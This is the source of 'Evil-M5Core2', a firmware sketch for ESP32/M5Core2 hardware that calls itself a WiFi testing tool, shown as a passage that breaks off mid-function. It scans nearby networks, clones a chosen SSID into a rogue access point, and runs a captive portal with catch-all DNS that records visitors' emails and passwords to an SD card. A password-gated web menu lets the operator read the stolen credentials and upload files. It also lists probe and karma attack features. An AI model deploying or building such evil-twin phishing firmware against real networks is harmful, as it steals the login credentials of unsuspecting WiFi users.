  /*
     Evil-M5Core2 - WiFi Network Testing and Exploration Tool
  
     Copyright (c) 2024 7h30th3r0n3
  
     Permission is hereby granted, free of charge, to any person obtaining a copy
     of this software and associated documentation files (the "Software"), to deal
     in the Software without restriction, including without limitation the rights
     to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
     copies of the Software, and to permit persons to whom the Software is
     furnished to do so, subject to the following conditions:
  
     The above copyright notice and this permission notice shall be included in all
     copies or substantial portions of the Software.
  
     THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
     IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
     FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
     AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
     LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
     OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
     SOFTWARE.
  
     Disclaimer:
     This tool, Evil-M5Core2, is developed for educational and ethical testing purposes only. 
     Any misuse or illegal use of this tool is strictly prohibited. The creator of Evil-M5Core2 
     assumes no liability and is not responsible for any misuse or damage caused by this tool. 
     Users are required to comply with all applicable laws and regulations in their jurisdiction 
     regarding network testing and ethical hacking.
  */
  
  #include <WiFi.h>
  #include <WebServer.h>
  #include <DNSServer.h>
  #include <SD.h>
  #include <M5Unified.h>
  extern "C" {
    #include "esp_wifi.h"
    #include "esp_system.h"
  }
  
  static constexpr const gpio_num_t SDCARD_CSPIN = GPIO_NUM_4;
  
  WebServer server(80);
  DNSServer dnsServer;
  const byte DNS_PORT = 53;
  
  int currentIndex = 0, lastIndex = -1;
  bool inMenu = true;
  const char* menuItems[] = {"Scan WiFi", "Select Network", "Clone & Details" , "Start Captive Portal", "Stop Captive Portal" , "Change Portal", "Check Credentials", "Delete All Credentials", "Monitor Status", "Probe Attack", "Probe Sniffing", "Karma Attack", "Select Probe", "Delete Probe", "Delete All Probes", "Brigthness" };
  const int menuSize = sizeof(menuItems) / sizeof(menuItems[0]);
  
  const int maxMenuDisplay = 10;
  int menuStartIndex = 0;
    
  String ssidList[100];
  int numSsid = 0;
  bool isOperationInProgress = false;
  int currentListIndex = 0;
  String clonedSSID = "Evil-M5Core2";  
  int topVisibleIndex = 0; 
  
  // Connect to nearby wifi network automaticaly you can be connected and provide AP to connect
  const char* ssid = ""; // ssid to connect, no connection if blank
  const char* password = ""; // wifi password
  
  
   //password for web access to remote check captured credentials and send new html file !!!!!! CHANGE THIS !!!!!
  const char* accessWebPassword = "7h30th3r0n3";
  
  String portalFiles[30]; // 30 portals max 
  int numPortalFiles = 0;
  String selectedPortalFile = "/sites/normal.html"; // defaut portal
  int portalFileIndex = 0; 
  
  
  int nbClientsConnected = 0;
  int nbClientsWasConnected = 0;
  int nbPasswords = 0;
  bool isCaptivePortalOn = false;
  
  
  String macAddresses[10]; // 10 mac address max
  int numConnectedMACs = 0; 
  
  File fsUploadFile; // global variable for file upload
  
  String captivePortalPassword = ""; // 
  
  // Probe Sniffind part
  
  #define MAX_SSIDS_Karma 200
  
  char ssidsKarma[MAX_SSIDS_Karma][33];
  int ssid_count_Karma = 0;
  bool isScanningKarma = false;
  int currentIndexKarma = -1;
  int menuStartIndexKarma = 0;
  int menuSizeKarma = 0;
  const int maxMenuDisplayKarma = 9;
  
  enum AppState {
    StartScanKarma,
    ScanningKarma,
    StopScanKarma,
    SelectSSIDKarma
  };
  
  AppState currentStateKarma = StartScanKarma;
  
  bool isProbeSniffingMode = false;
  
  // Probe Sniffing end
  
  
  void setup() {
    M5.begin();
  
    M5.Display.setTextSize(2);
    M5.Display.setTextColor(TFT_WHITE);
    M5.Display.setTextFont(1);
  
    const char* startUpMessages[] = {
      "  There is no spoon...",
      "    Hack the Planet!",
      " Accessing Mainframe...",
      "    Cracking Codes...",
      "Decrypting Messages...",
      "Infiltrating the Network.",
      " Bypassing Firewalls...",
      "Exploring the Deep Web...",
      "Launching Cyber Attack...",
      " Running Stealth Mode...",
      "   Gathering Intel...",
      "     Shara Conord?",
      " Breaking Encryption...",
      "Anonymous Mode Activated.",
      " Cyber Breach Detected.",
      "Initiating Protocol 47...",
      " The Gibson is in Sight.",
      "  Running the Matrix...",
      "Neural Networks Syncing..",
      "Quantum Algorithm started",
      "Digital Footprint Erased.",
      "   Uploading Virus...",
      "Downloading Internet...",
      "  Root Access Granted.",
      "Cyberpunk Mode: Engaged.",
      "  Zero Days Exploited.",
      "Retro Hacking Activated.",
      " Firewall: Deactivated.",
      "Riding the Light Cycle...",
      "  Engaging Warp Drive...",
      "  Hacking the Holodeck..",
      "  Tracing the Nexus-6...",
      "Charging at 2,21 GigaWatt",
      "  Loading Batcomputer...",
      "  Accessing StarkNet...",
      "  Dialing on Stargate...",
      "   Activating Skynet...",
      " Unleashing the Kraken..",
      " Accessing Mainframe...",
      "   Booting HAL 9000...",
      " Death Star loading ...",
      " Initiating Tesseract...",
      "  Decrypting Voynich...",
      "   Hacking the Gibson...",
      "   Orbiting Planet X...",
      "  Accessing SHIELD DB...",
      " Crossing Event Horizon.",
      " Dive in the RabbitHole.",
      "   Rigging the Tardis...",
      " Sneaking into Mordor...",
      "Manipulating the Force...",
      "Decrypting the Enigma...",
      "Jacking into Cybertron..",
      "  Casting a Shadowrun...",
      "  Navigating the Grid...",
      " Surfing the Dark Web...",
      "  Engaging Hyperdrive...",
      " Overclocking the AI...",
      "   Bending Reality...",
      " Scanning the Horizon...",
      " Decrypting the Code...",
      "Solving the Labyrinth...",
      "  Escaping the Matrix...",
      " You know I-Am-Jakoby ?",
      "You know TalkingSasquach?",
      "            42           ",
      "    Don't be a skidz !",
      "  Hack,Eat,Sleep,Repeat",
      "   You know Samxplogs ?",
      " For educational purpose",
      "Time to learn something",
      "U Like Karma? Check Mana",
      "   42 because Universe ",
      "Navigating the Cosmos...",
      "Unlocking Stellar Secrets",
      "Galactic Journeys Await..",
      "Exploring Unknown Worlds.",
      "   Charting Star Paths...",
      "   Accessing zone 51... ",
      "Downloading NASAs server..",
      "   You know Pwnagotchi ?",
      "   You know FlipperZero?",
      "You know Hash-Monster ?",
      "Synergizing Neuromancer..",
      "Warping Through Cyberspac",
      "Manipulating Quantum Data",
      "Incepting Dreamscapes...",
      "Unlocking Time Capsules..",
      "Rewiring Neural Pathways.",
      "Unveiling Hidden Portals.",
      "Disrupting the Mainframe.",
      "Melding Minds w Machines.",
      "Bending the Digital Rules",
      "   Hack The Planet !!!",
      "Tapping into the Ether...",
      "Writing the Matrix Code..",
      "Sailing the Cyber Seas...",
      "  Reviving Lost Codes...",
      "   HACK THE PLANET !!!",
      " Dissecting DNA of Data",
      "Decrypting the Multiverse",
      "Inverting Reality Matrice",
      "Conjuring Cyber Spells...",
      "Hijacking Time Streams...",
      "Unleashing Digital Demons",
      "Exploring Virtual Vortexe",
      "Summoning Silicon Spirits",
      "Disarming Digital Dragons",
      "Casting Code Conjurations",
      "Unlocking the Ether-Net..",
  
    };
    const int numMessages = sizeof(startUpMessages) / sizeof(startUpMessages[0]);
  
    randomSeed(esp_random());
  
    int randomIndex = random(numMessages);
    const char* randomMessage = startUpMessages[randomIndex];

    
    if (!SD.begin(SDCARD_CSPIN, SPI, 40000000)) {
      Serial.println("Error..");
      Serial.println("SD card not mounted...");
    }else{
      Serial.println("SD card initialized !! ");
      drawImage("/img/startup.jpg");
      delay(2000);
    }
String batteryLevelStr = getBatteryLevel();
int batteryLevel = batteryLevelStr.toInt();

if (batteryLevel < 15) {
    drawImage("/img/low-battery.jpg");
    Serial.println("-------------------"); 
    Serial.println("!!!!Low Battery!!!!"); 
    Serial.println("-------------------"); 
    delay(4000);
}

    int textY = 80;
    int lineOffset = 10;
    int lineY1 = textY - lineOffset;
    int lineY2 = textY + lineOffset + 30; 
    
    M5.Display.clear();
    M5.Display.drawLine(0, lineY1, M5.Display.width(), lineY1, TFT_WHITE);
    M5.Display.drawLine(0, lineY2, M5.Display.width(), lineY2, TFT_WHITE);
  
    M5.Display.setCursor(80, textY);
    M5.Display.println(" Evil-M5Core2");
    Serial.println("-------------------");  
    Serial.println(" Evil-M5Core2");
    M5.Display.setCursor(75, textY + 20);
    M5.Display.println("By 7h30th3r0n3");
    M5.Display.setCursor(102, textY + 45);
    M5.Display.println("v1.1.1 2024");
    Serial.println("By 7h30th3r0n3");
    Serial.println("-------------------"); 
    M5.Display.setCursor(10, textY + 120);
    M5.Display.println(randomMessage);
    Serial.println(" ");
    Serial.println(randomMessage);
    Serial.println("-------------------"); 
    firstScanWifiNetworks();

    
    if (strcmp(ssid, "") != 0) {
          WiFi.mode(WIFI_MODE_APSTA);
          WiFi.begin(ssid, password);
  
          unsigned long startAttemptTime = millis();
  
          while (WiFi.status() != WL_CONNECTED && millis() - startAttemptTime < 3000) {
              delay(500);
              Serial.println("Trying to connect to Wifi...");
          }
  
          if (WiFi.status() == WL_CONNECTED) {
              Serial.println("Connected to wifi !!!");
          } else {
              Serial.println("Fail to connect to Wifi or timeout...");
          }
      } else {
          Serial.println("SSID is empty.");
          Serial.println("Skipping Wi-Fi connection.");
      }
    

  
  
xTaskCreate(
          backgroundTask, 
          "BackgroundTask", 
          9216, /*stack*/
          NULL, 
          0, 
          NULL);
          
  }

void backgroundTask(void *pvParameters) {
      for (;;) {
          dnsServer.processNextRequest();
          server.handleClient();
          vTaskDelay(100); 
      }
  }


void drawImage(const char *filepath) {
  fs::File file = SD.open(filepath);
  M5.Display.drawJpgFile(SD, filepath);

  file.close();
}



void firstScanWifiNetworks() {
      WiFi.mode(WIFI_STA);
      WiFi.disconnect();
      unsigned long startTime = millis();
      int n;
      while (millis() - startTime < 2000) {
          n = WiFi.scanNetworks();
          if (n != WIFI_SCAN_RUNNING) break;
      }
  
      if (n == 0) {
          Serial.println("No network found ...");
      } else {
          Serial.print(n);
          Serial.println(" Near Wifi Networks : ");
          Serial.println("-------------------");
          numSsid = min(n, 100);
          for (int i = 0; i < numSsid; i++) {
              ssidList[i] = WiFi.SSID(i);
              Serial.println(ssidList[i]);
          }
          Serial.println("-------------------");
      }
  }
  
      unsigned long previousMillis = 0;
      const long interval = 1000; 
  
  void loop() {
    M5.update();
    dnsServer.processNextRequest();
    server.handleClient();
    if (inMenu) {
      if (lastIndex != currentIndex) {
        drawMenu();
        lastIndex = currentIndex;
      }
      handleMenuInput();
    } else {
      switch (currentStateKarma) {
        case StartScanKarma:
          if (M5.BtnB.wasPressed()) {
            startScanKarma(); 
            currentStateKarma = ScanningKarma; 
          }
          break;
  
        case ScanningKarma:
          if (M5.BtnB.wasPressed()) {
            stopScanKarma();
            currentStateKarma = ssid_count_Karma > 0 ? StopScanKarma : StartScanKarma;
          }
          break;
  
        case StopScanKarma:
          handleMenuInputKarma(); 
          break;
          
        case SelectSSIDKarma:
        handleMenuInputKarma(); 
        break;
      }
  
      if (M5.BtnB.wasPressed() && currentStateKarma == StartScanKarma) {
        inMenu = true;
        isOperationInProgress = false;
      }
    }
  }
  
  
  
  void executeMenuItem(int index) {
    inMenu = false;
    isOperationInProgress = true;
    switch (index) {
      case 0:
        scanWifiNetworks();
        break;
      case 1:
        showWifiList();
        break;
      case 2:
        showWifiDetails(currentListIndex); 
        break;
      case 3:
        createCaptivePortal();
        break;
      case 4:
        stopCaptivePortal();
        break;
      case 5:
        changePortal();
        break;
      case 6:
        checkCredentials();
        break;
      case 7:
        deleteCredentials();
        break;
      case 8: 
        displayMonitorPage1();
        break;
      case 9: 
        probeAttack();
        break;    
      case 10: 
        probeSniffing();
        break;
      case 11: 
       karmaAttack();
        break;
      case 12: 
        listProbes();
        break;
      case 13: 
        deleteProbe();
        break;
      case 14: 
        deleteAllProbes();        
        break;
      case 15: 
        brightness();
        break;
    }
    isOperationInProgress = false;
  }
  
  void handleMenuInput() {
      if (M5.BtnA.wasPressed()) {
          currentIndex--;
          if (currentIndex < 0) {
              currentIndex = menuSize - 1;
          }
      } else if (M5.BtnC.wasPressed()) {
          currentIndex++;
          if (currentIndex >= menuSize) {
              currentIndex = 0;
          }
      }
      menuStartIndex = max(0, min(currentIndex, menuSize - maxMenuDisplay));
  
      if (M5.BtnB.wasPressed()) {
          executeMenuItem(currentIndex);
      }
  }
  
  
  void drawMenu() {
      M5.Display.clear();
      M5.Display.setTextSize(2);
      M5.Display.setTextFont(1);
  
      int lineHeight = 24;
      int startX = 5;
      int startY = 0;
  
      for (int i = 0; i < maxMenuDisplay; i++) {
          int menuIndex = menuStartIndex + i;
          if (menuIndex >= menuSize) break; 
  
          if (menuIndex == currentIndex) {
              M5.Display.fillRect(0, startY + i * lineHeight, M5.Display.width(), lineHeight, TFT_NAVY);
              M5.Display.setTextColor(TFT_GREEN);
          } else {
              M5.Display.setTextColor(TFT_WHITE);
          }
          M5.Display.setCursor(startX, startY + i * lineHeight + (lineHeight / 2) - 8);
          M5.Display.println(menuItems[menuIndex]);
      }
      M5.Display.display();
  }
  
  
  
  void scanWifiNetworks() {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    unsigned long startTime = millis();
    int n;
    while (millis() - startTime < 5000) {
      M5.Display.clear();
      M5.Display.fillRect(0, M5.Display.height() - 20, M5.Display.width(), 20, TFT_BLACK);
      M5.Display.setCursor(50 , M5.Display.height()/ 2 );
      M5.Display.print("Scan in progress... ");
      Serial.println("-------------------");
      Serial.println("WiFi Scan in progress... ");
      M5.Display.display();
      n = WiFi.scanNetworks();
      if (n != WIFI_SCAN_RUNNING) break;
    }
    Serial.println("-------------------");
    Serial.println("Near Wifi Network : ");
    numSsid = min(n, 100);
    for (int i = 0; i < numSsid; i++) {
      ssidList[i] = WiFi.SSID(i);
      Serial.println(ssidList[i]);
    }
    Serial.println("-------------------");
    Serial.println("WiFi Scan Completed ");
    Serial.println("-------------------");
    waitAndReturnToMenu("Scan Completed");
    
  }
  
  
  void showWifiList() {
    const int listDisplayLimit = M5.Display.height() / 18; 
    int listStartIndex = max(0, min(currentListIndex, numSsid - listDisplayLimit));
    
    M5.Display.clear();
    M5.Display.setTextSize(2);
    for (int i = listStartIndex; i < min(numSsid, listStartIndex + listDisplayLimit + 1); i++) {
      if (i == currentListIndex) {
        M5.Display.fillRect(0, (i - listStartIndex) * 18, M5.Display.width(), 18, TFT_NAVY);
        M5.Display.setTextColor(TFT_GREEN);
      } else {
        M5.Display.setTextColor(TFT_WHITE);
      }
      M5.Display.setCursor(10, (i - listStartIndex) * 18);
      M5.Display.println(ssidList[i]);
    }
    M5.Display.display();
  
  while (!inMenu) {
      M5.update();
      if (M5.BtnA.wasPressed()) {
        currentListIndex--;
        if (currentListIndex < 0) {
          currentListIndex = numSsid - 1; 
        }
        showWifiList();
      } else if (M5.BtnC.wasPressed()) {
        currentListIndex++;
        if (currentListIndex >= numSsid) {
          currentListIndex = 0; 
        }
        showWifiList(); 
      } else if (M5.BtnB.wasPressed()) {
        inMenu = true;
        Serial.println("-------------------");
        Serial.println("SSID " +ssidList[currentListIndex] + " selected");
        Serial.println("-------------------");
        waitAndReturnToMenu(ssidList[currentListIndex] + "\n      selected");
        
      }
    }
  }
  
  void showWifiDetails(int networkIndex) {
  if (networkIndex >= 0 && networkIndex < numSsid) {
      M5.Display.clear();
      M5.Display.setTextSize(2);
      int y = 10; 
  
      // SSID
      M5.Display.setCursor(10, y);
      M5.Display.println("SSID: " + (ssidList[networkIndex].length() > 0 ? ssidList[networkIndex] : "N/A"));
      y += 40;
  
      // Channel
      int channel = WiFi.channel(networkIndex);
      M5.Display.setCursor(10, y);
      M5.Display.println("Channel: " + (channel > 0 ? String(channel) : "N/A"));
      y += 20;
  
      // Security
      String security = getWifiSecurity(networkIndex);
      M5.Display.setCursor(10, y);
      M5.Display.println("Security: " + (security.length() > 0 ? security : "N/A"));
      y += 20;
  
      // Signal Strength
      int32_t rssi = WiFi.RSSI(networkIndex);
      M5.Display.setCursor(10, y);
      M5.Display.println("Signal: " + (rssi != 0 ? String(rssi) + " dBm" : "N/A"));
      y += 20;
  
      // MAC Address
      uint8_t* bssid = WiFi.BSSID(networkIndex);
      String macAddress = bssidToString(bssid);
      M5.Display.setCursor(10, y);
      M5.Display.println("MAC: " + (macAddress.length() > 0 ? macAddress : "N/A"));
      y += 20;
      
      M5.Display.setCursor(230, 220);
      M5.Display.println("Clone");
      M5.Display.setCursor(140, 220);
      M5.Display.println("Back");
      
      M5.Display.display();
      Serial.println("------Wifi-Info----");
      Serial.println("SSID: " + ssidList[networkIndex]);
      Serial.println("Channel: " + String(WiFi.channel(networkIndex)));
      Serial.println("Security: " + security);
      Serial.println("Signal: " + String(rssi) + " dBm");
      Serial.println("MAC: " + macAddress);
      Serial.println("-------------------");
  
      while (!inMenu) {
        M5.update();
        if (M5.BtnC.wasPressed()) {
          cloneSSIDForCaptivePortal(ssidList[networkIndex]);
          inMenu = true;
          waitAndReturnToMenu(ssidList[networkIndex] + " Cloned...");
          Serial.println(ssidList[networkIndex] + " Cloned...");
          drawMenu(); 
        } else if (M5.BtnB.wasPressed()) {
          inMenu = true;
          drawMenu(); 
        }
      }
    }
  }
  
  String getWifiSecurity(int networkIndex) {
    switch (WiFi.encryptionType(networkIndex)) {
      case WIFI_AUTH_OPEN:
        return "Open";
      case WIFI_AUTH_WEP:
        return "WEP";
      case WIFI_AUTH_WPA_PSK:
        return "WPA_PSK";
      case WIFI_AUTH_WPA2_PSK:
        return "WPA2_PSK";
      case WIFI_AUTH_WPA_WPA2_PSK:
        return "WPA_WPA2_PSK";
      case WIFI_AUTH_WPA2_ENTERPRISE:
        return "WPA2_ENTERPRISE";
      default:
        return "Unknown";
    }
  }
  
  String bssidToString(uint8_t* bssid) {
    char mac[18];
    snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
             bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
    return String(mac);
  }
  
  void cloneSSIDForCaptivePortal(String ssid) {
    clonedSSID = ssid;
  }
  
void createCaptivePortal() {
      String ssid = clonedSSID.isEmpty() ? "Evil-M5Core2" : clonedSSID;
      WiFi.mode(WIFI_MODE_APSTA);
      if (captivePortalPassword == ""){
         WiFi.softAP(clonedSSID.c_str());
        }else{
         WiFi.softAP(clonedSSID.c_str(),captivePortalPassword.c_str());
        }

      dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
      isCaptivePortalOn = true;
  
      server.on("/", HTTP_GET, []() {
          String email = server.arg("email");
          String password = server.arg("password");
          if (!email.isEmpty() && !password.isEmpty()) {
              saveCredentials(email, password);
              server.send(200, "text/plain", "Credentials Saved");
          } else {
              Serial.println("-------------------");
              Serial.println("Direct Web Access !!!");
              Serial.println("-------------------");
              servePortalFile(selectedPortalFile);
          }
      });
  
  
      server.on("/evil-m5core2-menu", HTTP_GET, []() {
          String html = "<!DOCTYPE html><html><head><style>";
          html += "body{font-family:sans-serif;background:#f0f0f0;padding:40px;display:flex;justify-content:center;align-items:center;height:100vh}";
          html += "form{text-align:center;}div.menu{background:white;padding:20px;box-shadow:0 4px 8px rgba(0,0,0,0.1);border-radius:10px}";
          html += " input,a{margin:10px;padding:8px;width:80%;box-sizing:border-box;border:1px solid #ddd;border-radius:5px}";
          html += " a{display:inline-block;text-decoration:none;color:white;background:#007bff;text-align:center}";
          html += "</style></head><body>";
          html += "<div class='menu'><form action='/evil-m5core2-menu' method='get'>";
          html += "Password: <input type='password' name='pass'><br>";
          html += "<a href='javascript:void(0);' onclick='this.href=\"/credentials?pass=\"+document.getElementsByName(\"pass\")[0].value'>Credentials</a>";
          html += "<a href='javascript:void(0);' onclick='this.href=\"/uploadhtmlfile?pass=\"+document.getElementsByName(\"pass\")[0].value'>Upload File On SD</a>";
          html += "<a href='javascript:void(0);' onclick='this.href=\"/check-sd-file?pass=\"+document.getElementsByName(\"pass\")[0].value'>Check SD File</a>";
          html += "<a href='javascript:void(0);' onclick='this.href=\"/Change-Portal-Password?pass=\"+document.getElementsByName(\"pass\")[0].value'>Change WPA Password</a>";
          html += "</form></div></body></html>";
          server.send(200, "text/html", html);
          Serial.println("-------------------");
          Serial.println("evil-m5core2-menu access.");
          Serial.println("-------------------");
      });
  
      server.on("/credentials", HTTP_GET, []() {
      String password = server.arg("pass");
      if (password == accessWebPassword) {
          File file = SD.open("/credentials.txt");
          if (file) {
              if (file.size() == 0) {
                  server.send(200, "text/html", "<html><body><p>No credentials...</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
              } else {
                  server.streamFile(file, "text/plain");
              }
              file.close();
          } else {
              server.send(404, "text/html", "<html><body><p>File not found.</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
          }
      } else {
          server.send(403, "text/html", "<html><body><p>Unauthorized.</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
      }
  });
  
      
      server.on("/check-sd-file", HTTP_GET, handleSdCardBrowse);
      server.on("/download-sd-file", HTTP_GET, handleFileDownload);
      server.on("/list-directories", HTTP_GET, handleListDirectories);
      
      server.on("/uploadhtmlfile", HTTP_GET, []() {
          if (server.arg("pass") == accessWebPassword) {
              String password = server.arg("pass");
              String html = "<!DOCTYPE html><html><head>";
              html += "<meta charset='UTF-8'>";
              html += "<meta name='viewport' content='width=device-width, initial-scale=1.0'>";
              html += "<title>Upload File</title></head>";
              html += "<body><div class='container'>";
              html += "<form id='uploadForm' method='post' enctype='multipart/form-data'>";
              html += "<input type='file' name='file' accept='*/*'>";
              html += "Select directory: <select id='dirSelect' name='directory'>";
              html += "<option value='/'>/</option>";
              html += "</select><br>";
              html += "<input type='submit' value='Upload file'>";
              html += "</form>";
              html += "<script>";
              html += "window.onload = function() {";
              html += "    var passValue = '" + password + "';";
              html += "    var dirSelect = document.getElementById('dirSelect');";
              html += "    fetch('/list-directories?pass=' + encodeURIComponent(passValue))";
              html += "        .then(response => response.text())";
              html += "        .then(data => {";
              html += "            const dirs = data.split('\\n');";
              html += "            dirs.forEach(dir => {";
              html += "                if (dir.trim() !== '') {";
              html += "                    var option = document.createElement('option');";
              html += "                    option.value = dir;";
              html += "                    option.textContent = dir;";
              html += "                    dirSelect.appendChild(option);";
              html += "                }";
              html += "            });";
              html += "        })";
              html += "        .catch(error => console.error('Error:', error));";
              html += "    var form = document.getElementById('uploadForm');";
              html += "    form.onsubmit = function(event) {";
              html += "        event.preventDefault();";
              html += "        var directory = dirSelect.value;";
              html += "        form.action = '/upload?pass=' + encodeURIComponent(passValue) + '&directory=' + encodeURIComponent(directory);";
              html += "        form.submit();";
              html += "    };";
              html += "};";
              html += "</script>";
              html += "<style>";
              html += "body,html{height:100%;margin:0;display:flex;justify-content:center;align-items:center;background-color:#f5f5f5}select {padding: 10px; margin-bottom: 10px; border-radius: 5px; border: 1px solid #ddd; width: 92%; background-color: #fff; color: #333;}.container{width:50%;max-width:400px;min-width:300px;padding:20px;background:#fff;box-shadow:0 4px 8px rgba(0,0,0,.1);border-radius:10px;display:flex;flex-direction:column;align-items:center}form{width:100%}input[type=file],input[type=submit]{width:92%;padding:10px;margin-bottom:10px;border-radius:5px;border:1px solid #ddd}input[type=submit]{background-color:#007bff;color:#fff;cursor:pointer;width:100%}input[type=submit]:hover{background-color:#0056b3}@media (max-width:600px){.container{width:80%;min-width:0}}";
              html += "</style></body></html>";

              server.send(200, "text/html", html);
          } else {
          server.send(403, "text/html", "<html><body><p>Unauthorized.</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
          }
      });
  
  
      
      server.on("/upload", HTTP_POST, []() {
        server.send(200);
      }, handleFileUpload);
  
      server.on("/delete-sd-file", HTTP_GET, handleFileDelete);
      
      server.on("/Change-Portal-Password", HTTP_GET, handleChangePassword);
  
  
      server.onNotFound([]() {
          Serial.println("-------------------");
          Serial.println("Portal Web Access !!!");
          Serial.println("-------------------");
          servePortalFile(selectedPortalFile);
      });
  
      server.begin();
       Serial.println("-------------------");
       Serial.println("Portal " + ssid + " Deployed with " + selectedPortalFile.substring(7) + " Portal !");
       Serial.println("-------------------");
      waitAndReturnToMenu("     Portal\n        " + ssid + "\n        Deployed");
  }
  
  
  String getDirectoryHtml(File dir, String path, String password) {
      String html = "<!DOCTYPE html><html><head><style>";
      html += "body{font-family:sans-serif;background:#f0f0f0;padding:20px}";
      html += "ul{list-style-type:none;padding:0}";
      html += "li{margin:10px 0;padding:5px;background:white;border:1px solid #ddd;border-radius:5px}";
      html += "a{color:#007bff;text-decoration:none}";
      html += "a:hover{color:#0056b3}";
      html += ".red{color:red}";
      html += "</style></head><body><ul>";
      if (path != "/") {
          String parentPath = path.substring(0, path.lastIndexOf('/'));
          if (parentPath == "") parentPath = "/";
          html += "<li><a href='/check-sd-file?dir=" + parentPath + "&pass=" + password + "'>[Up]</a></li>";
      }
      
      while (File file = dir.openNextFile()) {
          String fileName = String(file.name());
          String displayFileName = fileName;
          if (path != "/" && fileName.startsWith(path)) {
              displayFileName = fileName.substring(path.length());
              if (displayFileName.startsWith("/")) {
                  displayFileName = displayFileName.substring(1);
              }
          }
  
          String fullPath = path + (path.endsWith("/") ? "" : "/") + displayFileName;
          if (!fullPath.startsWith("/")) {
              fullPath = "/" + fullPath;
          }
  
          if (file.isDirectory()) {
              html += "<li>Directory: <a href='/check-sd-file?dir=" + fullPath + "&pass=" + password + "'>" + displayFileName + "</a></li>";
          } else {
              html += "<li>File: <a href='/download-sd-file?filename=" + fullPath + "&pass=" + password + "'>" + displayFileName + "</a> (" + String(file.size()) + " bytes) <a href='#' onclick='confirmDelete(\"" + fullPath + "\")' style='color:red;'>Delete</a></li>";
          }
          file.close();
      }
      html += "</ul>";
  
      html += "<script>"
              "function confirmDelete(filename) {"
              "  if (confirm('Are you sure you want to delete ' + filename + '?')) {"
              "    window.location.href = '/delete-sd-file?filename=' + filename + '&pass=" + password + "';"
              "  }"
              "}"
              "window.onload = function() {const urlParams = new URLSearchParams(window.location.search);if (urlParams.has('refresh')) {urlParams.delete('refresh');history.pushState(null, '', location.pathname + '?' + urlParams.toString());window.location.reload();}};"
              "</script>";
  
      return html;
  }
  
  
  void handleSdCardBrowse() {
      String password = server.arg("pass");
      if (password != accessWebPassword) {
          server.send(403, "text/html", "<html><body><p>Unauthorized</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
          return;
      }
  
      String dirPath = server.arg("dir");
      if (dirPath == "") dirPath = "/";
  
      File dir = SD.open(dirPath);
      if (!dir || !dir.isDirectory()) {
          server.send(404, "text/html", "<html><body><p>Directory not found.</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
          return;
      }
  
      
      String html = "<p><a href='/evil-m5core2-menu'><button style='background-color: #007bff; border: none; color: white; padding: 6px 15px; text-align: center; text-decoration: none; display: inline-block; font-size: 16px; margin: 4px 2px; cursor: pointer;'>Menu</button></a></p>";
      html += getDirectoryHtml(dir, dirPath, accessWebPassword);
      server.send(200, "text/html", html);
      dir.close();
  }
  
  void handleFileDownload() {
      String fileName = server.arg("filename");
      if (!fileName.startsWith("/")) {
          fileName = "/" + fileName;
      }
      if (SD.exists(fileName)) {
          File file = SD.open(fileName, FILE_READ);
          if (file) {
              String downloadName = fileName.substring(fileName.lastIndexOf('/') + 1);
              server.sendHeader("Content-Disposition", "attachment; filename=" + downloadName);
              server.streamFile(file, "application/octet-stream");
              file.close();
              return;
          }
      }
      server.send(404, "text/html", "<html><body><p>File not found.</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
  }
  
  
void handleFileUpload() {
    HTTPUpload& upload = server.upload();
    String password = server.arg("pass");

    if (password != accessWebPassword) {
        Serial.println("Unauthorized access attempt");
        server.send(403, "text/html", "<html><body><p>Unauthorized</p></body></html>");
        return;
    }

    if (upload.status == UPLOAD_FILE_START) {
        String filename = upload.filename;
        String directory = server.arg("directory");
        
        if (!directory.startsWith("/")) {
            directory = "/" + directory;
        }

        if (!directory.endsWith("/")) {
            directory += "/";
        }

        String fullPath = directory + filename; 

        fsUploadFile = SD.open(fullPath, FILE_WRITE);
        Serial.print("Upload Start: ");
        Serial.println(fullPath);
    } else if (upload.status == UPLOAD_FILE_WRITE) {
        if (fsUploadFile) {
            fsUploadFile.write(upload.buf, upload.currentSize);
        }
    } else if (upload.status == UPLOAD_FILE_END) {
        if (fsUploadFile) {
            fsUploadFile.close();
            Serial.print("Upload End: ");
            Serial.println(upload.totalSize);
            server.send(200, "text/html", "<html><body><p>File Uploaded Successfully</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
            Serial.println("File Uploaded Successfully");
        } else {
            server.send(500, "text/html", "<html><body><p>500: couldn't create file</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
            Serial.println("500: couldn't create file");
        }
    }
}

 void handleListDirectories() {
    String password = server.arg("pass");
    if (password != accessWebPassword) {
        server.send(403, "text/plain", "Unauthorized");
        return;
    }

    File root = SD.open("/"); 
    String dirList = "";

    while (File file = root.openNextFile()) {
        if (file.isDirectory()) {
            dirList += String(file.name()) + "\n"; 
        }
        file.close();
    }
    root.close();
    server.send(200, "text/plain", dirList);
}

void listDirectories(File dir, String path, String &output) {
    while (File file = dir.openNextFile()) {
        if (file.isDirectory()) {
            output += String(file.name()) + "\n";
            listDirectories(file, String(file.name()), output); 
        }
        file.close();
    }
}


void handleFileDelete() {
      String password = server.arg("pass");
      if (password != accessWebPassword) {
          server.send(403, "text/html", "<html><body><p>Unauthorized</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
          return;
      }
  
      String fileName = server.arg("filename");
      if (!fileName.startsWith("/")) {
          fileName = "/" + fileName;
      }
